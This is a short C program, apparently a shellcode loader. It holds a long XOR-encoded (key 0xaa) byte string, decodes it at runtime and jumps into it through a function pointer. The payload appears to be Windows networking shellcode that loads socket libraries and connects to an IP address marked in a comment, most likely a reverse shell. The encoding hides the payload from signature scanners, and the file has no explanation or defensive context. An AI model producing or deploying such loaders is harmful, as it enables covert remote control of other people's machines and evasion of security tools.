#include<stdio.h>
#include<string.h>
int main(){
	// encoded shellcode using xor with 0xaa
	char *shellcode = "\x9b\x78\xce\x21\xe8\x9a\x21\xea\xa6\x21\xda\xbe\x07\x3c\x07\x21\xf2\xba\x21\xf9\x96\xab\x70\x21\xf8\xd2\xab\x70\x21\xd8\x8a\xab\x74\x9b\x63\xeb\x07\xab\x72\x2b\x92\xed\xcf\xde\xfa\xdf\x5e\x2b\xd2\xae\xd8\xc5\xc9\xeb\xdf\x41\x2b\xd2\xa2\xce\xce\xd8\xcf\xdf\x48\x21\xd8\x8e\xab\x74\xcc\x21\xa6\xe4\xe3\x21\xd8\xb6\xab\x74\x21\xbe\x24\xab\x70\xf9\x27\x9e\x8e\x23\xfc\xae\x9b\x63\xf9\xf8\xfb\xc2\xcb\xd8\xd3\xeb\xc2\xe6\xc3\xc8\xd8\xc2\xe6\xc5\xcb\xce\xfe\xf9\x55\x78\x23\xec\xa2\xc2\xc6\xc6\xcb\xcb\xcc\x2b\xc6\x8e\xa8\xcb\xcb\xc2\x99\x98\x84\xce\xc2\xdd\xd9\x98\xf5\xfe\x55\x7a\x23\xec\xa6\xc2\xc6\xc6\xcb\xcb\xcc\x2b\xc6\x8e\xa8\xcb\xcb\xc2\x99\x98\x84\xce\xc2\xdf\xd9\xcf\xd8\xfe\x55\xfc\xa2\x23\xec\xba\x21\xf4\xae\x9b\x63\xfb\xc2\xc4\xce\xc5\xdd\xc2\xc6\xcf\xfd\xc3\xc2\xc5\xc4\xd9\xc5\xc2\xed\xcf\xde\xe9\xfe\x21\xac\xfa\x55\x79\x23\xec\xbe\x21\xf4\xae\xc2\xc5\xdd\xcb\xcb\xcc\x2b\xc6\x8e\xa8\xcb\xcb\xc2\xfd\xc3\xc4\xce\xc2\xf9\xc2\xc5\xdd\xfe\x21\xec\xba\xfa\x55\x79\x23\xec\xb2\x21\xf4\xae\xc2\xdf\xda\xcb\xcb\xcc\x2b\xc6\x8e\xa8\xcb\xcb\xc2\xde\xcb\xd8\xde\xc2\xfd\xf9\xeb\xf9\xfe\x21\xec\xa6\xfa\x55\x79\x23\xec\xb6\x21\xf4\xae\xc2\xde\xeb\xcb\xcb\xcc\x2b\xc6\x8e\xa8\xcb\xcb\xc2\xc5\xc9\xc1\xcf\xc2\xfd\xf9\xeb\xf9\xfe\x21\xec\xa6\xfa\x55\x79\x23\xec\x8a\x21\xf4\xae\xc2\xcf\xc9\xde\xcb\x2a\xc6\x8e\xa9\xcb\xc2\xc9\xc5\xc4\xc4\xfe\x21\xec\xa6\xfa\x55\x79\x23\xec\x8e\x21\xf4\xae\xc2\xd9\xeb\xcb\xcb\xcc\x2b\xc6\x8e\xa8\xcb\xcb\xc2\xc5\xc9\xcf\xd9\xc2\xde\xcf\xfa\xd8\xc2\xe9\xd8\xcf\xcb\xfe\x21\xac\xfa\x55\x79\x23\xec\x82\x21\xf4\xae\xc2\xcf\xd9\xd9\xcb\x2a\xc6\x8e\xa9\xcb\xc2\xfa\xd8\xc5\xc9\xc2\xef\xd2\xc3\xde\xfe\x21\xac\xfa\x55\x79\x23\xec\x86\x55\xfc\xbe\x9b\x63\xfb\xfa\x55\xfc\xb2\x9b\x63\xcc\x13\x3a\xab\x83\x66\xfe\x9b\x63\xcc\x13\xa8\xa8\xfb\x55\xfc\xb6\x9b\x63\xfb\xfb\xfb\x1b\xac\xfb\x9b\x63\xeb\xfb\xeb\xfb\x55\xfc\x8a\x23\xec\x9a\x21\xec\x9a\xc2"
	"\xd5\xab\xab\xab"//\x6a\x02\xab\xc6"//ip address 
	"\xcc\xc2\xa6\x50\x9b\x71\x2a\x69\xa8\xcc\xf9\x23\x48\xc0\xba\xf8\xfa\x3d\x55\xfc\x8e\x9b\x63\x93\x62\xdf\x77\xc2\xc9\xc7\xce\xcb\x29\xc6\x8e\xa9\xcb\x23\x48\xfd\xfd\xfd\x9b\x71\x9b\x63\x2a\x6b\xb8\xf9\x48\x57\xcc\x6d\xee\x8e\x96\xab\xab\x6c\xee\x8e\xba\xee\x27\xee\x8e\xba\xfe\xfa\xf9\xf9\xf9\xe9\xf9\xe1\xf9\xf9\xf8\xf9\x55\xfc\x82\xf9\x55\xfc\x86";
    char encoded[strlen(shellcode)];
	printf("length: %d\n",strlen(shellcode));
	for(int i=0;i<strlen(shellcode);i++){
		encoded[i] = shellcode[i] ^ 0xaa ;
	}
	int (*ret)()=(int (*)())encoded;
	(*ret)();
	return 0;
}
